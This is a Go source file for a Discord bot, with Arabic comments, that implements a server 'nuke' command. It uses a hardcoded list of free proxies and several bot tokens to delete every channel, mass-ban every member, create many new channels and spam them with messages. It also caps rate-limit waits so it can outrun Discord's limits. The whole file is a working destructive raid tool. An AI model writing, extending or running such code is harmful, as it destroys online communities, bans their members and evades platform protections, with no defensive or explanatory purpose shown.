package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

// لستة بروكسيات مجانية مدمجة مسبقاً داخل الكود لتوفير عناء البحث والنسخ
var embeddedFreeProxies = []string{
	"103.152.112.5:80",
	"185.199.229.156:8080",
	"45.33.32.156:3128",
	"190.61.35.153:8080",
	"200.105.215.12:80",
	"103.203.73.5:80",
	"182.253.114.52:8080",
	"114.233.153.22:9002",
	"120.52.31.29:80",
	"111.225.152.18:8080",
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdNuke := "autoproxy_turbo"
	commandNuke := &discordgo.ApplicationCommand{
		Name:        cmdNuke,
		Description: "Auto-proxy embedded turbo execution",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "التوكنات مفصولة بفاصلة (,)",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		if i.ApplicationCommandData().Name == cmdNuke {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 تم تفعيل المحرك الذكي مع البروكسيات المضمنة تلقائياً!",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			tokensInput := optionMap["bot_tokens"].StringValue()
			
			var tokens []string
			for _, t := range strings.Split(tokensInput, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			guildID := i.GuildID
			botID := s.State.User.ID

			go executeEmbeddedProxyNuke(tokens, embeddedFreeProxies, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
	fmt.Println("⚡ بوت البروكسيات المضمنة يعمل بأقصى كفاءة تلقائية!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeEmbeddedProxyNuke(tokens []string, proxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
	if len(tokens) == 0 {
		return
	}

	var clients []*http.Client
	for _, proxyStr := range proxies {
		proxyURL, err := url.Parse("http://" + proxyStr)
		if err != nil {
			continue
		}
		client := &http.Client{
			Transport: &http.Transport{
				Proxy:               http.ProxyURL(proxyURL),
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 1000,
				IdleConnTimeout:     60 * time.Second,
				DialContext: (&net.Dialer{
					Timeout:   2 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
			},
			Timeout: 3 * time.Second,
		}
		clients = append(clients, client)
	}

	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
	}

	botIDs := map[string]bool{botID: true}

	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	var allUserIDs []string
	after := ""
	for {
		members, err := s.GuildMembers(guildID, after, 1000)
		if err != nil || len(members) == 0 {
			break
		}
		for _, m := range members {
			if m != nil && m.User != nil {
				if !botIDs[m.User.ID] {
					allUserIDs = append(allUserIDs, m.User.ID)
				}
				after = m.User.ID
			}
		}
		if len(members) < 1000 {
			break
		}
	}

	channels, err := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if err == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	makeProxyRequest := func(method, urlStr string, body []byte, tokenIndex int) bool {
		client := clients[tokenIndex%len(clients)]
		token := tokens[tokenIndex%len(tokens)]

		for attempt := 0; attempt < 3; attempt++ {
			req, err := http.NewRequestWithContext(context.Background(), method, urlStr, bytes.NewBuffer(body))
			if err != nil {
				return false
			}
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

			resp, err := client.Do(req)
			if err != nil {
				client = clients[(tokenIndex+attempt+1)%len(clients)]
				continue
			}

			if resp.StatusCode == 429 {
				retryAfterStr := resp.Header.Get("Retry-After")
				resp.Body.Close()
				if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
					if retryAfter > 2.0 {
						retryAfter = 2.0
					}
					time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
				} else {
					time.Sleep(50 * time.Millisecond)
				}
				continue
			}

			resp.Body.Close()
			return true
		}
		return false
	}

	// 1. حذف الرومات القديمة
	chQueue := make(chan string, len(oldChannelIDs))
	for _, id := range oldChannelIDs {
		chQueue <- id
	}
	close(chQueue)

	var wgDel sync.WaitGroup
	for w := 0; w < 40; w++ {
		wgDel.Add(1)
		go func(workerID int) {
			defer wgDel.Done()
			for chID := range chQueue {
				makeProxyRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, workerID)
			}
		}(w)
	}
	wgDel.Wait()

	// 2. باند الأعضاء بأقصى سرعة موزعة على البروكسيات التلقائية
	if len(allUserIDs) > 0 {
		userQueue := make(chan string, len(allUserIDs))
		for _, uid := range allUserIDs {
			userQueue <- uid
		}
		close(userQueue)

		var wgBan sync.WaitGroup
		banWorkers := 50
		for w := 0; w < banWorkers; w++ {
			wgBan.Add(1)
			go func(workerID int) {
				defer wgBan.Done()
				for uid := range userQueue {
					banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
					makeProxyRequest("PUT", banURL, nil, workerID)
				}
			}(w)
		}
		wgBan.Wait()
	}

	// 3. إنشاء الرومات الجديدة
	roomChan := make(chan struct {
		Payload []byte
		Index   int
	}, len(channelPayloads))

	for idx, p := range channelPayloads {
		roomChan <- struct {
			Payload []byte
			Index   int
		}{p, idx}
	}
	close(roomChan)

	var newChannelIDs []string
	var muChannels sync.Mutex
    var wgCreate sync.WaitGroup

	for w := 0; w < 30; w++ {
		wgCreate.Add(1)
		go func(workerID int) {
			defer wgCreate.Done()
			client := clients[workerID%len(clients)]
			token := tokens[workerID%len(tokens)]

			for item := range roomChan {
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(item.Payload))
				req.Header.Set("Authorization", "Bot "+token)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

				resp, err := client.Do(req)
				if err != nil {
					continue
				}

				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var chResult map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
						if chID, ok := chResult["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, chID)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
			}
		}(w)
	}
	wgCreate.Wait()

	// 4. إرسال الرسائل
	if len(newChannelIDs) > 0 && messagesCount > 0 {
		type MsgTask struct {
			ChID     string
			WorkerID int
		}
		msgQueue := make(chan MsgTask, len(newChannelIDs)*messagesCount)

		for _, chID := range newChannelIDs {
			for m := 0; m < messagesCount; m++ {
				msgQueue <- MsgTask{ChID: chID, WorkerID: m}
			}
		}
		close(msgQueue)

		var wgMsg sync.WaitGroup
		for w := 0; w < 50; w++ {
			wgMsg.Add(1)
			go func(workerID int) {
				defer wgMsg.Done()
				for task := range msgQueue {
					makeProxyRequest("POST", "https://discord.com/api/v10/channels/"+task.ChID+"/messages", msgPayload, workerID+task.WorkerID)
				}
			}(w)
		}
		wgMsg.Wait()
	}
}
